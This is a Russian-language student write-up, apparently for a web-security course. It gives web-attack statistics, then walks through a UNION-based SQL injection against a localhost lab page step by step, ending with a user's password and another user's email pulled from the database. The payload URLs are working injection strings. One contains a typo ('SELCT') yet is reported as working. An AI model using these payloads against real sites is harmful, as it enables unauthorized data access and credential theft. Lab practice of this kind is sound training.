# Часть I

[По данным Expert Insights](https://expertinsights.com/web-security/50-web-security-stats-you-should-know) 26% всех кибератак и 70% успешных проникновений связаны с веб-сервисами.

Топ-5 уязвимостей на сайтах зараженных вредоносным ПО:

1. Backdoor (65%)

2. Filehacker (48%)

3. Malicious eval request (22%)

4. Shell script (22%)

5. Injector (21%)

[Deepstrike заявляет](https://deepstrike.io/blog/vulnerability-statistics-2025) что 90% плагинов WordPress содержат web CVE и 41% из них пригодны для серьезных атак. 

[По данным PT Security](https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/#id11) 27% веб атак на организации и 12% веб атак на частных лиц в 2025 году были успешными.

[Лаборатория Касперского](https://statistics.securelist.com/ru/web-anti-virus/month) приводит топ-5 типов угроз, обнаруженных в Интернете:

1. Trojan.Script.Generic (25.47%)
2. Trojan.Script.Agent.gen (11.21%)
3. Trojan.PDF.Badur.gen (8.15%)
4. Trojan.Script.SAgent.gen (5.21%)
5. Hoax.HTML.Phish.gen (5.13%)

# Часть II

http://localhost:8080/task/?id=1 даёт логин admin

http://localhost:8080/task/?id=0 не даёт никакого ответа

http://localhost:8080/task/?id=1%27+OR+%271%27=%271%27-- по ошибке узнаем что база данных - MySQL и что в запросе есть LIMIT 1 (также не забываем добавить + после --)

Пробуем UNION атаку (используем id=0 из-за LIMIT 1 так как он ничего не возвращает):

http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL--+ - неправильное количество столбцов

http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL,NULL--+ - неправильное количество столбцов

http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL,NULL,NULL--+ - попали

http://localhost:8080/task/?id=0%27+UNION+SELCT+%27a%27,NULL,NULL--+ - находим что первая колонка может содержать текст

http://localhost:8080/task/?id=0%27+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--+ - пытаемся узнать названия всех таблиц (но врезаемся в LIMIT 1)

http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.tables--+ - используем GROUP_CONCAT и получаем названия всех таблиц, но здесь много мусора в виде дефолтных таблиц MySQL

http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+- фильтруем по базам данных (т.е. без дефолтных таблиц): имеем таблицы emails и users

http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(column_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27--+- - в users 6 колонок: USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password

http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name=%27emails%27--+- - в emails 2 колонки: id, email_id

http://localhost:8080/task/?id=0%27+UNION+SELECT+username,password,NULL+FROM+users+WHERE+username=%27Volk2%27--+ - **получаем пароль пользователя Volk2: Wa spoiuuuuu**

Так как username и почта лежат в разных таблицах, чтобы узнать почту по нику Vinni-pukh сначала придется узнать id:

http://localhost:8080/task/?id=0%27+UNION+SELECT+id,NULL,NULL+FROM+users+WHERE+username=%27Vinni-pukh%27--+ - id=4

http://localhost:8080/task/?id=0%27+UNION+SELECT+email_id,NULL,NULL+FROM+emails+WHERE+id=%274%27--+ - **почта у Vinni-pukh: honey_lover@otus-lab.com**

P.S.: я правда делал своими руками, просто до этого уже практиковался на портсвиггере 